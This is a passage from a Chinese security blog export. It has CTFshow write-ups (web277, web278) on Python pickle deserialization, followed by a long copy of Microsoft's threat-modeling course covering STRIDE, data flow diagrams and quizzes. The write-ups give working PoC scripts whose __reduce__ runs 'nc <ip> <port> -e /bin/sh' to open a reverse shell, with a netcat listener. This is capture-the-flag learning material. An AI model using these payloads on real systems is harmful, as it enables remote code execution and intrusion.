（获取文件inode） filemtime （获取文件的修改时间） fileowner fileperms （获取文件权限） is_dir is_executable is_file is_link （判断文件名是否为符号链接） is_readable is_writable is_writeable parse_ini_file （解析配置文件） copy unlink stat （获取文件相关信息） readfile （输入文件内容） 表格参考自：https://v0w.top/2020/03/12/phar-unsearise/ web277 python 反序列化Werkzeug/1.0.1 Python/3.7.9 pickle 反序列化 Python反序列化，之前有过一些研究，晚点把Python反序列化基础链接更新上来~ 尝试了很多，发现是无回显的，需要反弹shell poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).system, (&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://7a111fcd-ce76-4dde-9c49-5aec7f2bd40f.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) 先在服务器上监听 1nc -lvvp 7779 运行脚本 1python3 web277.py 回到服务器上 cat 一下即可 web278 python 反序列化 简单绕过Werkzeug/1.0.1 Python/3.7.9 pickle 反序列化 和 web277 差不多，只不过过滤了 system，换个函数即可 poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).popen, (&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://e281b968-e161-414c-bd80-c7a79045351e.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) 一些参考的题解 https://blog.csdn.net/rfrder/article/details/113808539 (目标wp，框架题也有自己分析，膜拜！) https://blog.csdn.net/miuzzx/article/details/110558192 https://blog.csdn.net/weixin_43578492/article/details/112128767","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"威胁建模安全基础知识","slug":"thread-modeling","date":"2021-04-04T04:54:33.000Z","updated":"2021-04-05T07:32:03.568Z","comments":true,"path":"2021/04/04/thread-modeling/","link":"","permalink":"https://tari.moe/2021/04/04/thread-modeling/","excerpt":"","text":"实习过程中零零碎碎学了一些，但还没系统学过，发现微软有个挺全面的，打算系统学习一波~ https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/ 感觉讲的特别好…所以就直接索性一边看一边补充的 copy 下来了 威胁建模简介威胁建模是一种有助于保护系统、应用程序、网络和服务的有效技术。它可帮助你在开发生命周期的早期确定潜在的威胁和降低风险策略。 威胁建模使用以图形形式演示系统工作方式的数据流关系图。之后，它应用一个框架来帮助你发现和修复安全问题。 如果未首先建立威胁模型而发布系统，该系统将使你的客户和组织面临风险。 简单起见，此学习路径将系统、应用程序和服务统称为系统。 何时使用威胁建模在设计新系统或更新现有系统时，可使用威胁建模。 示例包括： 创建新的 Azure 微服务，用于报告组织的云资源使用情况以便进行预算 设计公共 API 以向客户提供对数据的访问权限 向现有应用程序添加新功能 谁可以进行威胁建模只要了解系统如何工作，并且对安全性有基本的理解，任何人都可以进行威胁建模。 此技术可应用于任何： 软件交付方式（ 如 敏捷型 或 瀑布型 ，好多瀑布型介绍很繁琐，直接找了个对比的） 部署节奏（每小时、每月或每年） 学习目标在本模块，你将了解威胁建模的四个概括性步骤，并能够学得以下内容： 了解明确要求和假设以帮助创建数据流关系图的重要性 了解可帮助你查找系统中安全问题的框架 了解有助于减轻或消除潜在威胁的安全控制类别 重点介绍在部署之前验证假设、要求和修复的重要性 无必备知识即可学习 （ 模块1 | 威胁建模阶段只要了解系统工作原理，并具有信息安全知识，任何人都可以使用威胁建模技术。 此方法分为四个不同的阶段，每个阶段都包含重要步骤，可帮助你创建数据流关系图并对其进行分析，以发现潜在的威胁。 阶段 标题 说明 1 设计 明确系统的所有要求，并创建数据流关系图 2 中断 将威胁建模框架应用到数据流关系图 3 修复 确定如何正确组合安全控制来解决每个问题 4 验证 验证是否满足了要求 本模块(1) 中的单元将较为概括地介绍重要的威胁建模概念，本文 模块2 开始将详细讨论这些概念。 步骤1 - 设计设计阶段是进行威胁建模活动的基础。 你需要尽可能多地收集关于你所构建的内容及所用资源的数据。 目标 清楚地了解系统的工作原理 列出系统使用的每个服务 枚举有关环境和默认安全配置的所有假设 使用正确的上下文深度级别创建数据流关系图 如果不完成此阶段，你可能会忽略系统的重要安全设计注意事项，这可能会使你的客户面临风险。 提出有关系统的问题尽可能多地提出有关系统的问题。 可以考虑以下问题： 区域 问题 系统说明 系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？ 系统环境 系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？ 方案 用户将如何使用系统？ 如何不使用系统？ 权限 系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？ 云提供商 系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 操作系统 系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 第一方和第三方 系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 帐户 系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？ 标识和访问控制 系统将如何帮助保护这些帐户？ 它会依赖 Azure Active Directory (Azure AD) 吗？ 它会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能吗？ 令牌和会话 系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？ 旁路 系统是否使用或需要后门？ 如果需要，它将如何工作？ 记录、监视和备份 系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？ 网络 将使用哪些入侵检测和保护系统？ 如何对通信进行加密？ 数据 系统将创建或处理哪种类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？ 机密管理 系统如何处理密钥、证书和凭据？ 上面列出的内容很广泛，但并不详尽。 与你的同事和安全团队联系，以明确系统的所有相关上下文。 如果你有专门的安全团队，请与他们安排白板会议以进行初始设计。 它将节省相当长的时间。 创建数据流关系图使用答案创建数据流关系图。 它显示了数据生命周期中每个阶段的数据，包括信任区中的更改。 示例包括： 用户登录到 Azure 中托管的 Web 应用程序以访问数据 管理员更改 Web 应用程序使用的弹性资源的默认安全配置 自动化的每日脚本，用于监视 Web 应用程序的活动日志并通知管理员任何异常情况 Microsoft 工程团队需要提交数据流关系图，这是其安全合规性要求。 这些关系图有助于进行与安全性相关的探讨。 图解工具Microsoft 工程师建议使用现在提供的两种工具之一： Threat Modeling Tool 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio，（要钱的 打扰了 关系图元素数据流关系图显示了给定系统中的数据流。 它通常以用户或数据存储的请求开始，以数据存储或 Analytics Services 结束。 数据流关系图使用不同的形状来指示它们所表示的元素。 元素 形状 定义 过程 接收、修改输入或将输入重定向到输出的任务，如 Web 服务。 数据存储 永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。 外部实体 直接控制之外的任务、实体或数据存储，如用户和第三方 API。 数据流 进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。 信任边界 信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。 数据流关系图元素还需要上下文，以帮助人们了解如何在系统中的使用和保护它们。 数据流图标中应包含的信息量数据流关系图中包含的信息量取决于几个关键因素： 因素 说明 正在构建的系统类型 如果系统不处理敏感数据或仅在内部使用，则它可能比面向外部的系统需要更少的上下文 安全团队所需的上下文 安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次 如果未能包含正确的上下文，将导致安全检查不完整、系统存在潜在的风险。 关系图层次为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择： 层次 标题 说明 0 系统 任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。 1 流程 使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。 2 子过程 关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。 3 更详细 关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。 大多数数据流关系图应同时包含第 0 层和第 1 层。 与安全团队交流，确认所需的层次深度。 工具 Threat Modeling Tool 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio，（要钱的 打扰了 知识检查 设计阶段要进行哪些工作？ A. 你知道系统的工作方式。 还可以确定从云提供商和集成服务继承的安全要求、保证或差距 B. 此时不必研究所有安全保证、假设和差距，唯一的任务就是创建数据流关系图 C. 在创建数据流关系图之前，确定并解决与系统相关的所有安全问题 参考答案：== A == 解释：A. 在创建数据流关系图之前，请尽可能收集有关系统的上下文。B. 在设计阶段较早收集尽可能多的上下文，你就可以做出明智的决策以更好地保护系统。C. 在设计阶段之后的中断和修复阶段执行创建关系图的任务。 步骤2 - 中断在中断阶段，需使用数据流关系图查找针对系统的潜在威胁。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。 目标 选择以 “保护系统” 或 “了解攻击者” 为核心的方法 （可参考模块4了解这两种方法） 使用 STRIDE 框架识别常见威胁（STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题），即 欺骗（Spoofing） 篡改（Tampering） 否认（Repudiation） 资讯泄露（Information disclosure），可能是隐私泄露或是资料外泄 阻断服务攻击（Denial of service） 特权提升（Elevation of privilege 如果不完成此阶段，就不会发现系统中的潜在威胁，这可能会导致未来出现违规现象。 确定方法侧重点首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括： 侧重点 可以查找的内容示例 系统 发现用户与系统之间的未加密连接存在问题。 攻击者 进一步了解方法、动机和强化系统入口点的方法。 资产 基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。 Microsoft 产品工程师主要致力于保护系统。 渗透测试团队两者兼顾。 选择威胁框架接下来，选择一个框架，帮助生成系统中的潜在威胁。 Microsoft 通常使用 STRIDE（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。 此框架可帮助你提出有关系统的几个重要问题： 威胁 定义 问题 威胁示例 欺骗 攻击者冒充某人或某物 通信的双方是否都通过了身份验证？ 通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限。 篡改 攻击者在未经授权的情况下更改数据 如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？ 通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息。 否认性 攻击者声称尚未执行任何操作 每个操作是否可以绑定到标识？ 声称没有删除数据库记录。 信息泄露 攻击者看到了不应看到的数据 如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？ 访问安全控制较弱的未授权文档和文件夹。 拒绝服务 攻击者使你的系统崩溃 系统中是否存在资源受限的区域？ 向网络发送大量请求。 权限提升 攻击者未经授权而可访问数据 如何得知某人可以执行此操作？ 利用输入处理逻辑或内存中的弱点来提取数据。 知识检查 中断阶段要进行哪些工作？ A. 通过相关框架选择重点领域，以系统地识别系统中的潜在威胁。 B. 通过相关框架选择重点领域，以系统地识别可以应用到系统的解决方案。 C. 安全团队开会讨论，选择重点领域和相关框架，以系统地识别系统中的潜在威胁。 参考答案：== A == 解释：A. 在使用 STRIDE 查找潜在威胁时，请关注系统或攻击者。B. 此任务属于阶段 3 - 修复阶段。C. 在大多数情况下，可以选择与安全团队开会讨论，但不强制要求这么做（除非组织有相关要求）。 步骤3 - 修复在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。 目标 根据优先级框架或安全 bug 栏衡量每个威胁的优先级 在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪 生成对应于 STRIDE 威胁的安全控制建议 选择一项或多项安全控制类型和功能来应对每个威胁 解决任务 如果不完成此阶段，就找不到安全控制来帮助降低风险或正确跟踪每个威胁。 设置威胁跟增工作流确定威胁的优先级首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。 此过程使用三个关键变量： 变量 说明 影响 使用 STRIDE 类别分配影响。 严重性 使用内部 bug 栏或优先级框架来分配最坏情况下的严重性。 风险 对安全控制有效性和实现成本进行计算。 Microsoft 工程师使用内部安全 bug 栏，为威胁分配“严重”、“重要”、“中等”、“低”或“信息”严重性等级。 请咨询安全团队，确认如何确定问题的优先级。 创建任务接下来，在 Azure DevOps Services 等 bug 管理解决方案中添加每个威胁。 部分优点包括： 进一步确定问题责任人 有效跟踪历史记录 让你能够使用标准化模板来进行优先级和解决方案演练 评估威胁有效性和成本查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例： 威胁 安全控制 安全控制示例 欺骗 身份验证 发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性。 篡改 完整性 验证输入以防止处理恶意有效负载和错误处理意外行为。 否认性 不可否认性 创建和保护包含用户操作和时间戳的安全日志。 信息泄露 保密性 应用访问控制列表，以确保合适的用户可以访问适当的数据。 拒绝服务 可用性 使用弹性资源管理不断增加或减少的使用量。 权限提升 授权 使用最少的访问量运行服务。 可能有这样的安全控制，可以同时减轻或完全消除多个威胁。 例如，使用 SSL/TLS 创建安全传输通道，以帮助防止恶意数据修改或泄露。 安全控制措施类型和功能安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。 你可以选择一种或多种安全控制类型： 物理类型，如摄像头 技术类型，如加密 管理类型，如策略 它们可能有一项或多项安全控制功能： 函数 描述 预防 降低威胁的概率或影响，如防火墙。 检测 识别发生的攻击，如监视。 纠正 控制系统如何响应其受到的攻击，如系统修补程序。 恢复 从攻击中恢复系统，如备份。 阻碍 阻止攻击者访问系统，如最低权限。 为每个问题添加安全控制详细信息在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异： 解决方案 描述 减轻 将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。 转移 由其他系统或团队处理问题。 避免 去除系统中包含问题的部分。 接受 没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。 知识检查 修复阶段要进行哪些工作？ A. 在部署系统之前验证所有修补程序。 B. 在这一阶段，你将生成并验证一系列安全控制，并设置其优先级，以减轻或消除风险。 C. 此时，选择框架以帮助生成潜在的威胁。 参考答案：== B == 解释：A. 属于步骤 4 - 验证阶段。B. psw 每个威胁都对应到一个可降低或消除风险的安全控制。 根据组织的安全风险惯例，确定这些威胁的优先级并进行跟踪。C. 此任务属于步骤 2 - 中断阶段。 步骤4 - 验证验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。 目标 确认系统满足所有新旧安全要求 配置云提供商、操作系统和组件以满足安全要求 确保使用正确的安全控制解决所有问题 在部署前对系统进行手动和自动验证 如果不完成此阶段，就无法验证是否已成功完成安全工作。 验证要求和设置默认值首先，验证是否满足第一阶段创建的所有要求。 示例： 网络安全计划 机密管理解决方案实施 日志记录和监视系统 标识和访问控制 然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。 示例： 启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据 使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限 跨所有配置文件启用 Windows 防火墙 应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。 执行验证最后一部分涉及运行手动和自动验证。 在 Microsoft，部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。 如果以下任一问题的答案为“是”，最好设置较短的验证周期： 我的系统会在部使用吗？ 它可以处理机密数据吗？ 我必须遵守某些规定吗？ 我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？ 知识检查 验证阶段要进行哪些工作？ A. 实施一系列适用的安全控制，以减轻或消除风险。 B. 在将代码推送到暂存分支进行部署之前，需要对其进行手动检查。 C. 针对先前产生的威胁手动或自动验证系统，以验证安全控制是否降低或消除了风险。 参考答案：== C == 解释：A. 此任务属于步骤 3 - 修复阶段。B. 此答案更适用于操作方面，而不是威胁建模过程。C. 此阶段的主要工作是验证修复、假设和满足要求。 小结摘要威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。 它可以识别潜在的威胁并推荐风险降低策略，以帮助你在开发生命周期的早期实现安全目标。 本模块涵盖了以下内容： 了解明确要求和假设以帮助创建数据流关系图的重要性 了解可帮助你查找系统中安全问题的框架 了解有助于减轻或消除潜在威胁的安全控制类别 重点介绍在部署之前验证假设、要求和修复的重要性 后续步骤在此学习路径的后续几个模块中，我们将了解在四个阶段引入的每个概念，并进行详细讨论： 模块 标题 说明 2 使用数据流关系图元素创建威胁模型 了解数据流关系图中的每个元素，包括何时使用它们以及要包含的上下文。 3 提供具有适当深度层的上下文 在创建数据流关系图之前，了解每个上下文层次的差异和适用情形。 4 处理数据流关系图时关注适当的威胁模型 了解关注威胁建模活动的不同方法。 5 使用框架识别威胁并找到减少或消除风险的方法 深入研究 STRIDE，并进一步了解存在的风险以及如何针对这些风险保护系统。 6 设置问题的优先级并应用安全控制措施 了解如何设置威胁优先级，并了解系统安全控制的不同类型和功能。 7 使用推荐工具创建数据流图 了解可用于威胁建模的工具。 了解详细信息安全开发生命周期https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 模块2 | 使用数据流关系图元素创建威胁模型简介数据流关系图由呈现为形状和线条的元素构成。 数据流关系图以图形方式表示系统的各个主要部分。 示例包括： 用于存储客户数据的 Azure DB 处理用户请求的 Web 服务 与系统交互的用户 跨信任区域级别更改的数据流 在威胁建模中使用元素及其交互，以帮助确定威胁并降低系统风险。 此过程可帮助工程师更有效地进行协作，同时保护其系统免受最常见的威胁攻击。 本模块将介绍数据流关系图的每个元素。 这些元素具有不同的形状和功能，并且需要特定的上下文。 在整个学习路径中，元素也可以称为“模具”。 何时使用元素在创建数据流关系图时使用这些元素。 关系图可显示系统创建、操纵、存储以及删除数据的方式。 我们以第一个模块中的示例为基础进行构建： Azure 微服务 - 添加元素以指定用户、身份验证过程、数据存储、数据请求和响应处理过程。 别忘了指定信任区域级别更改。 公共 API - 添加元素以指定用户、数据存储、日志记录和监视流程以及系统的其他部分。 现有应用程序上的新功能 - 添加元素以表示系统的现有部分和新的部分。 学习目标在本模块中，你将能够： 区分每个元素的形状和功能 在创建数据流关系图时，包含元素的正确上下文 无必备知识即可学习 （ 数据流关系图元素数据流关系图由各种形状组成，这些形状用于创建系统的图形表示形式。 每个形状都表示一个独特的功能。 系统将分析每个交互以帮助识别潜在的威胁和找到降低风险的方法。 通过正确使用形状，你能更好地明白同事和安全团队提供的信息。 每个人都能了解该系统的工作方式。 这还可以使他们无需查阅无数的设计文档和开发计划即可启动系统并使其正常运行。 如果无法在数据流关系图中正确地体现系统的所有部分，则有可能部署具有潜在漏洞的系统。 元素 形状 定义 示例 过程 接收、修改输入或将输入重定向到输出的任务，如 Web 服务。 Web 服务 数据存储 永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。 Web 缓存和 Azure DB 外部实体 直接控制之外的任务、实体或数据存储，如用户和第三方 API。 用户和第三方 API 数据流 进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。 连接字符串和有效负载 信任边界 信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。 用户通过 Internet 连接到安全的公司网络 我们将在接下来的几个单元中讨论每个元素。 过程 - 任务元素 此元素用一个圆圈表示，表示可以修改接收的输入或将接收的输入重定向到其相应输出的活动。 示例包括： 接收 API 调用请求并将其转发到 API 处理服务的微服务 在数据写入数据存储之前验证数据输入的代码 何时使用过程元素在以下项之间添加过程元素： 数据存储 - 处理数据存储之间的所有通信的过程 具有其他元素的外部实体 - 处理所有任务和通信的过程 过程 - 处理所有任务的过程 根据数据流关系图所需的信息深度级别，可以使用过程元素来表示几个不同的用例： 用例 描述 存根 在较高级别的数据流关系图中将过程元素用作“存根”，这是一种有助于保持整洁的好方法。 它涉及为特定过程创建一个单独的数据流关系图，并将其映射回更高级别的关系图。 它的工作方式类似于“放大”功能，在“放大”过程时，可以使用深层数据流关系图。 多个任务 当过程处理多个任务时，此用例适用。 此上下文非常重要，因为它允许查看数据流程图的任何人为每个任务应用适当的安全控制。 包括上下文在每个过程元素中包含以下上下文： 上下文 问题 代码 此过程是否以 C#、C++、Objective C、Java 或脚本语言运行？ 权限级别 此过程是否需要内核、本地或管理级别权限才能运行？ 服务隔离 该过程是否在沙盒中运行？ 输入 此过程可以接受所有人、本地帐户还是仅限管理员的输入？ 验证 此过程如何分析、处理和接受输入？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最能描述过程？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== A == 解释：A. 门户将处理用户输入，并将其发送到过程的下一部分。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 数据存储 - 存储元素 此元素用平行线表示，表示临时或永久存储的数据。 示例包括： 使用浏览器缓存来存储与用户会话相关的数据 向数据库添加安全日志事件 何时使用数据存储元素 在每次将数据存储在 Azure DB 或本地缓存等位置时 如果要在两个数据存储之间建立通信，请不要忘记在它们之间添加进程 数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪 确保将数据后期处理包含在内，例如 Azure Analytics 等分析服务。 此过程经常被忽略。 包含上下文在每个数据存储元素中包含以下上下文： 上下文 问题 类型 系统是否使用 Azure SQL、Cookie、本地或其他某种类型的存储？ 如果是，系统使用的是哪种存储？ 功能 如何使用存储？ 它是否用于共享数据、存储备份、安全日志、凭据和机密？ 权限级别 如何实现访问控制？ 拥有读写权限的人员有哪些？ 其他控制 数据是否加密？ 磁盘是否加密？ 是否使用数字签名？ 知识检查 以下哪一项操作最能描述数据存储？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== B == 解释：A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 外部实体 - 无控制元素 外部实体元素由正方形表示，外部实体可以是过程、数据存储，甚至是直接控制之外的完整系统。 示例包括： 与服务交互的用户 与第三方身份验证服务紧密集成 组织内由其他团队创建的服务 何时使用外部实体元素 在要表示不能直接修改的内容时 数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪 包含上下文在每个外部实体元素中包含以下上下文： 上下文 问题 源 实体是内部实体还是外部实体？ 类型 实体是用户、服务提供商还是 Web 服务？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最准确地描述了外部实体？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== C == 解释：A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 这 C 答案的解释好像有点问题？应该解释为 第三方 API 向请求者启动了数据流？ 数据流 - 传输元素中的数据 元素之间的数据移动用方向箭头表示，**用于指示数据源和目标之间的通信**。 示例包括： 用户提交的用于访问服务的凭据 过程发出的向数据存储添加项的请求 何时使用数据流元素 在每个元素交互之间 调出正在传输的数据类型，并包括其传输方式 在大多数情况下，包括对每个请求的响应 包含上下文包含每个数据流元素的以下上下文： 上下文 问题 描述 数据流是否传递会话令牌、SQL 字符串或用户凭据？ 如果不是，那么数据流传递哪些内容？ 协议 流使用 HTTPS 还是 SOAP？ 如果都不是，那么流使用的是什么协议？ 流序列 系统是否枚举数据流以便更容易遵循流序列？ 类型 数据流中包含哪些类型的数据？ Cookie？ XML？ SOAP 有效负载？ REST 有效负载？ JSON 有效负载？ 其他控制 数据流是否启用了伪造保护？ 是否启用了其他安全标志？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最能描述数据流？ A. 用户凭据从过程传输到身份验证服务提供商。 B. 存储会话令牌以供以后使用。 C. 第三方 API 处理服务分析请求。 参考答案：== A == 解释：A. 传输数据的行为是与数据流相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 处理数据的行为是与过程相关的事件。 信任边界 - 信任区域更改元素信任边界框 信任边界线 信任边界用虚线或方框表示，用于描述跨不同信任区域级别的数据流。 示例包括： 防火墙 与第三方服务的连接 系统的某些部分仅对管理员可用 信任区域不断变化的区域最易受到攻击者的攻击，应谨慎设计此类区域。 Microsoft 已预定义了一些供工程师内部使用的信任区域要求。你能清楚地确定要应用哪些边界。对于 Microsoft 的员工，请与安全团队联系以了解详细信息。 何时使用信任边界元素关于信任边界，需要记住以下几个要点： 包含信任边界以处理跨不同信任区域的数据流 信任边界线用于表示跨大型环境（例如 Internet）的数据流 信任边界框表示小型环境，例如沙盒环境和企业网络 包含上下文在每个信任边界元素中包含以下上下文： 上下文 问题 描述 公司网络边界？Internet？ Azure 订阅？ 知识检查 以下哪一项操作最能描述跨信任边界的数据？ A. 用户发送到托管在 Azure 上的 Web 服务的数据。 B. 在同一 Azure 订阅下，从 Web 服务发送到 Azure 上的数据存储的数据。 C. 从数据存储发送到 Azure 上同一租户下的进程的数据。 参考答案：== A == 解释：A. 将数据从不受信任的区域传输到受信任区域的行为跨越了信任边界。B. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。C. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。 小结数据流关系图是系统的图形表示形式，它应包含每个适用的过程、数据存储、外部实体、数据流和信任边界。 本模块涵盖了以下内容： 区分了每个元素的形状和功能 了解了在创建数据流关系图时元素的正确上下文 模块3 | 提供具有适当深度层的上下文介绍工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。 深度层的重要性根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。 数据流关系图深度层可帮助你了解要包含多少上下文以及何时使用它们。 请与同事和安全团队联系，选择适当的深度层。 也可以将此模块用作参考。 学习目标在本模块中，你将能够： 了解数据流关系图深度层之间的差异 了解何时使用每个层 无必备知识即可学习 （ 数据流关系图深度层数据流关系图深度层可帮助你确定要成功进行威胁建模练习应包括多少上下文。 有多个因素可帮助确定要了解的深度。 每个系统都应该大致了解它们的工作方式。 大多数系统应该具有附加的数据流关系图，这些关系图侧重于需要仔细研究的系统部分。 示例包括： 分析高度敏感数据的过程 第三方身份验证系统 威胁建模中大致使用了四个深度层： 层 描述 0 对于所有系统都是必需的，并且包含主要系统部分。 1 对于大多数系统是必需的，并且包含每个系统部分的其他关系图。 2 对于高度敏感的系统是必需的，并且包含系统子部分的其他关系图。 3 对于关键级别系统或内核级别系统是必需的，并且包含每个过程的其他关系图。 我们将在接下来的几个单元中介绍各个深度层。 第 0 层 - 系统层数据流关系图的系统层是任何系统的起点，因此必须为所有系统创建系统层。 目标：表示主要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 系统层关系图应容纳在一个页面中。 它还应只包含系统处理的主要过程。 提供尽可能多的上下文，并清楚标记每个元素，以便任何人都能理解它的工作方式。 系统层也称为上下文层。 何时使用系统层你创建的每个系统都需要系统层。 高级别的上下文可以帮助任何人深入了解系统，从而参与更有意义的讨论。 深入了解系统部分在大多数情况下，系统部分需要进行更深入的研究，因为它们会带来风险。 示例包括： 任何新系统都会给环境带来未知风险 新的分析程序、协议和文件格式 新的身份验证和授权机制 新的机密存储或加密算法 与第三方身份验证系统（例如 Facebook）集成 主要功能所需的提升权限 所需的未加密信道 如果是这种情况，请为每个系统部分创建其他数据流关系图。 执行以下步骤： 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“Web 